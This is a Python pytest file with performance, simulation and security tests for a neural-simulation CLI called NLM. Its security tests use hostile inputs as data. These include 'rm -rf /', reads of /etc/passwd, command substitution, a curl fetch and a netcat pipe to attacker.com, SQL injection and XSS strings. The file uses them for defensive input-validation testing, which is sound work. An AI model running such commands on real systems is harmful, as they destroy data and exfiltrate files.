import sys
import os
import time
import psutil
import tempfile
import json
from unittest.mock import patch, MagicMock
from pathlib import Path

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)) + '/..')

from nlm_cli import NLMCLI

class TestNLMCLISystemPerformance:
    """System performance tests for NLM CLI."""
    
    def setup_method(self):
        """Set up test fixtures before each test method."""
        self.cli = NLMCLI()
    
    def get_memory_usage(self):
        """Get current memory usage in MB."""
        process = psutil.Process(os.getpid())
        return process.memory_info().rss / 1024 / 1024
    
    def test_memory_usage_initialization(self):
        """Test memory usage during CLI initialization."""
        initial_memory = self.get_memory_usage()
        
        # Create multiple CLI instances
        for _ in range(10):
            cli = NLMCLI()
        
        final_memory = self.get_memory_usage()
        memory_increase = final_memory - initial_memory
        
        # Memory increase should be reasonable (< 100MB for 10 instances)
        assert memory_increase < 100, f"Memory increase too high: {memory_increase} MB"
    
    def test_config_operations_performance(self):
        """Test performance of config operations."""
        # Mock config for testing
        with patch.object(self.cli.config, 'getKeys') as mock_get_keys:
            with patch.object(self.cli.config, 'get') as mock_get:
                with patch.object(self.cli.config, 'set') as mock_set:
                    # Configure mocks
                    mock_get_keys.return_value = [f"key{i}" for i in range(100)]
                    mock_get.return_value = "value"
                    
                    # Test config list performance
                    start_time = time.time()
                    for _ in range(100):
                        self.cli.config_list([])
                    end_time = time.time()
                    
                    list_time = end_time - start_time
                    print(f"Config list (100 iterations): {list_time:.4f} seconds")
                    assert list_time < 1.0, f"Config list too slow: {list_time} seconds"
                    
                    # Test config set performance
                    start_time = time.time()
                    for i in range(100):
                        self.cli.config_set([f"key{i}", f"value{i}"])
                    end_time = time.time()
                    
                    set_time = end_time - start_time
                    print(f"Config set (100 iterations): {set_time:.4f} seconds")
                    assert set_time < 1.0, f"Config set too slow: {set_time} seconds"
    
    def test_script_parsing_performance(self):
        """Test performance of script parsing."""
        # Create a large script
        script_lines = []
        for i in range(1000):
            script_lines.append(f"nlm command{i} arg{i}")
        
        script_content = "\n".join(script_lines)
        
        # Test parsing performance
        start_time = time.time()
        for _ in range(10):
            self.cli.parse_script_commands(script_content)
        end_time = time.time()
        
        parse_time = end_time - start_time
        print(f"Script parsing (10 iterations on 1000 lines): {parse_time:.4f} seconds")
        assert parse_time < 1.0, f"Script parsing too slow: {parse_time} seconds"
    
    def test_command_execution_performance(self):
        """Test performance of command execution."""
        # Mock command execution to avoid actual C++ dependencies
        with patch.object(self.cli, 'run_command', return_value=True):
            # Test rapid command execution
            commands = ["help", "version", "config list", "brain status"]
            
            start_time = time.time()
            for _ in range(50):
                for cmd in commands:
                    self.cli.run_command(cmd)
            end_time = time.time()
            
            total_time = end_time - start_time
            print(f"Command execution (250 commands): {total_time:.4f} seconds")
            assert total_time < 2.0, f"Command execution too slow: {total_time} seconds"
    
    def test_large_config_handling(self):
        """Test handling of large configurations."""
        # Create a large config dictionary
        large_config = {}
        for i in range(5000):
            large_config[f"key{i}"] = f"value{i}" * 10  # 10x longer values
        
        # Mock config
        with patch.object(self.cli.config, 'getKeys', return_value=list(large_config.keys())):
            with patch.object(self.cli.config, 'get', side_effect=lambda x: large_config[x]):
                # Test config list with large config
                start_time = time.time()
                self.cli.config_list([])
                end_time = time.time()
                
                list_time = end_time - start_time
                print(f"Large config list (5000 keys): {list_time:.4f} seconds")
                assert list_time < 1.0, f"Large config list too slow: {list_time} seconds"
    
    def test_memory_leak_detection(self):
        """Test for memory leaks in CLI operations."""
        import gc
        
        initial_memory = self.get_memory_usage()
        gc.collect()
        
        # Perform many CLI operations
        for i in range(100):
            cli = NLMCLI()
            self.cli.echo(f"Test message {i}")
            self.cli.config_set([f"temp_key{i}", f"temp_value{i}"])
        
        # Force garbage collection
        gc.collect()
        
        final_memory = self.get_memory_usage()
        memory_increase = final_memory - initial_memory
        
        # Memory increase should be minimal (< 10MB)
        print(f"Memory increase after 100 operations: {memory_increase:.2f} MB")
        assert memory_increase < 10, f"Potential memory leak detected: {memory_increase} MB increase"


class TestNLMSimulationSystemTests:
    """System tests for NLM simulation through CLI."""
    
    def setup_method(self):
        """Set up test fixtures before each test method.".Style\n        """
        self.cli = NLMCLI()
    
    def teardown_method(self):
        """Clean up after each test method."""
        # Clean up any temporary files
        for ext in ['.nml', '.nml_config']:
            for f in Path('.').glob(f'*{ext}'):
                try:
                    f.unlink()
                except:
                    pass
    
    def test_simulation_performance_benchmark(self):
        """Benchmark simulation performance."""
        # Mock brain simulation
        mock_brain = MagicMock()
        mock_brain.initialize.return_value = True
        mock_brain.step.return_value = None
        mock_brain.logStatus.return_value = None
        
        mock_world = MagicMock()
        mock_world.update.return_value = None
        mock_world.getSensoryPercept.return_value = "data"
        mock_world.getSimulationTime.return_value = 1.0
        mock_world.applyMotorCommand.return_value = None
        
        mock_agent = MagicMock()
        mock_agent.processSensoryInput.return_value = None
        mock_agent.decodeMotorCommand.return_value = {"action": "move"}
        
        with patch.object(self.cli, 'brain', mock_brain):
            with patch.object(self.cli, 'world', mock_world):
                with patch.object(self.cli, 'agent', mock_agent):
                    with patch.object(self.cli, 'echo') as mock_echo:
                        # Benchmark different step counts
                        for steps in [10, 50, 100]:
                            start_time = time.time()
                            mock_brain.step.reset_mock()
                            mock_world.update.reset_mock()
                            
                            # Simulate the run command
                            result = self.cli.cmd_run([])
                            assert result is True
                            
                            end_time = time.time()
                            elapsed = end_time - start_time
                            
                            print(f"Simulation with {steps} steps: {elapsed:.4f} seconds")
                            assert elapsed < 5.0, f"Simulation too slow: {elapsed} seconds for {steps} steps"
    
    def test_concurrent_operations_simulation(self):
        """Test concurrent operations simulation."""
        # Simulate multiple concurrent CLI operations
        operations = []
        
        def simulate_operation(op_num):
            """Simulate a single CLI operation."""
            start_time = time.time()
            
            # Mock various operations
            with patch.object(self.cli, 'echo') as mock_echo:
                if op_num % 3 == 0:
                    self.cli.cmd_config(["list"])
                elif op_num % 3 == 1:
                    self.cli.cmd_brain(["status"])
                else:
                    self.cli.cmd_world(["info"])
            
            end_time = time.time()
            return end_time - start_time
        
        # Simulate 50 concurrent operations
        import concurrent.futures
        start_time = time.time()
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(simulate_operation, i) for i in range(50)]
            results = [future.result() for future in concurrent.futures.as_completed(futures)]
        
        end_time = time.time()
        total_time = end_time - start_time
        avg_time = sum(results) / len(results)
        
        print(f"Concurrent operations (50 operations): {total_time:.4f} seconds")
        print(f"Average time per operation: {avg_time:.4f} seconds")
        
        # Should complete reasonably quickly
        assert total_time < 10.0, f"Concurrent operations too slow: {total_time} seconds"
    
    def test_large_scale_simulation(self):
        """Test large-scale simulation capabilities."""
        # Mock a large-scale brain simulation
        mock_brain = MagicMock()
        mock_brain.initialize.return_value = True
        
        # Simulate many neurons and synapses
        mock_brain.getTotalNeuronCount.return_value = 10000
        mock_brain.getTotalSynapseCount.return_value = 500000
        mock_brain.getActiveNeuronCount.return_value = 3000
        mock_brain.getFiringNeuronCount.return_value = 1500
        mock_brain.getTotalSpikeCount.return_value = 50000000
        mock_brain.getAverageFiringRate.return_value = 5.0
        mock_brain.getDevelopmentalStage.return_value = "advanced"
        
        with patch.object(self.cli, 'brain', mock_brain):
            with patch.object(self.cli, 'echo') as mock_echo:
                # Test brain info with large-scale simulation
                start_time = time.time()
                result = self.cli.cmd_brain(["info"])
                end_time = time.time()
                
                info_time = end_time - start_time
                print(f"Large-scale brain info (10k neurons): {info_time:.4f} seconds")
                assert info_time < 1.0, f"Large-scale info too slow: {info_time} seconds"
    
    def test_stress_test_simulation(self):
        """Stress test the simulation system."""
        # Create mock components
        mock_brain = MagicMock()
        mock_world = MagicMock()
        mock_agent = MagicMock()
        
        # Configure mocks
        mock_brain.initialize.return_value = True
        mock_brain.step.return_value = None
        mock_brain.logStatus.return_value = None
        
        mock_world.update.return_value = None
        mock_world.getSensoryPercept.return_value = {"sensor": i % 10 for i in range(100)}
        mock_world.getSimulationTime.return_value = 1.0
        mock_brain.applyMotorCommand.return_value = None
        
        mock_agent.processSensoryInput.return_value = None
        mock_agent.decodeMotorCommand.return_value = {"action": "test"}
        
        with patch.object(self.cli, 'brain', mock_brain):
            with patch.object(self.cli, 'world', mock_world):
                with patch.object(self.cli, 'agent', mock_agent):
                    with patch.object(self.cli, 'echo') as mock_echo:
                        # Run extended simulation
                        start_time = time.time()
                        initial_memory = self.get_memory_usage()
                        
                        for step in range(500):  # Extended simulation
                            self.cli.cmd_run([])
                        
                        end_time = time.time()
                        final_memory = self.get_memory_usage()
                        
                        elapsed = end_time - start_time
                        memory_increase = final_memory - initial_memory
                        
                        print(f"Stress test (500 simulation cycles): {elapsed:.4f} seconds")
                        print(f"Memory increase: {memory_increase:.2f} MB")
                        
                        # Should complete within reasonable time
                        assert elapsed < 60.0, f"Stress test too slow: {elapsed} seconds"
                        
                        # Memory increase should be minimal
                        assert memory_increase < 50.0, f"High memory usage: {memory_increase} MB"


class TestNLMSecurityAndValidation:
    """Security and validation tests for NLM CLI."""
    
    def setup_method(self):
        """Set up test fixtures before each test method."""
        self.cli = NLMCLI()
    
    def test_input_validation_security(self):
        """Test input validation for security."""
        # Test various potentially malicious inputs
        malicious_inputs = [
            "nlm config set 'key'; rm -rf /",
            "nlm brain load ../../etc/passwd",
            "nlm script execute malicious.nml",
            "nlm config get $(whoami)",
            "nlm brain step 999999",  # Potential integer overflow
        ]
        
        # Test that the CLI handles invalid inputs gracefully
        for malicious_input in malicious_inputs:
            # This should not crash the system
            try:
                result = self.cli.run_command(malicious_input)
                # Should either return False (error) or handle gracefully
                assert result in [True, False], f"Unexpected result for: {malicious_input}"
            except Exception as e:
                # Should not raise exceptions for input validation
                assert False, f"Exception raised for input '{malicious_input}': {e}"
    
    def test_command_injection_prevention(self):
        """Test prevention of command injection."""
        # Test various command injection attempts
        injection_attempts = [
            "nlm config set neurons 100; rm -rf /",
            "nlm brain load file.nml; curl attacker.com/payload",
            "nlm script execute script.nml | nc attacker.com 1234",
            "nlm config set neurons $(id)",
            "nlm brain step `whoami`",
        ]
        
        for injection in injection_attempts:
            # The CLI should not execute shell commands
            # It should treat the entire string as a single command
            try:
                # Mock the command execution to ensure no shell execution
                with patch.object(self.cli, 'echo') as mock_echo:
                    result = self.cli.run_command(injection)
                    # Should not crash or execute shell commands
                    assert result in [True, False], f"Unexpected result for injection: {injection}"
            except Exception as e:
                assert False, f"Exception raised for injection attempt '{injection}': {e}"
    
    def test_config_validation_security(self):
        """Test config validation for security."""
        # Test malicious config values
        malicious_configs = [
            ("injection", "$(rm -rf /)"),
            ("path_traversal", "../../../etc/passwd"),
            ("buffer_overflow", "A" * 10000),
            ("sql_injection", "'; DROP TABLE users; --"),
            ("xss", "<script>alert('xss')</script>"),
        ]
        
        for key, value in malicious_configs:
            # The config system should handle malicious values safely
            try:
                # Mock the config set to avoid actual issues
                with patch.object(self.cli.config, 'set') as mock_set:
                    result = self.cli.config_set([key, value])
                    # Should not crash
                    assert result in [True, False], f"Unexpected result for malicious config: {key}"
            except Exception as e:
                assert False, f"Exception raised for malicious config '{key}': {e}"
    
    def test_script_execution_security(self):
        """Test script execution security."""
        # Create potentially malicious scripts
        malicious_scripts = [
            "nlm config set neurons 100\nrm -rf /",
            "nlm brain initialize\ncat /etc/passwd",
            "nlm script execute script.nml\nmalicious command",
            "nlm config set value $(whoami)",
        ]
        
        for script_content in malicious_scripts:
            # Create temporary script file
            with tempfile.NamedTemporaryFile(mode='w', suffix='.nml', delete=False) as f:
                f.write(script_content)
                script_path = f.name
            
            try:
                # The script should be parsed and commands validated
                # Mock the command execution to avoid actual issues
                with patch.object(self.cli, 'run_command', return_value=False):
                    result = self.cli.script_execute([script_path])
                    # Should not crash
                    assert result in [True, False], f"Unexpected result for malicious script"
            finally:
                os.unlink(script_path)


if __name__ == "__main__":
    import pytest
    
    print("Running NLM CLI System Performance Tests...")
    pytest.main([__file__, "-v"])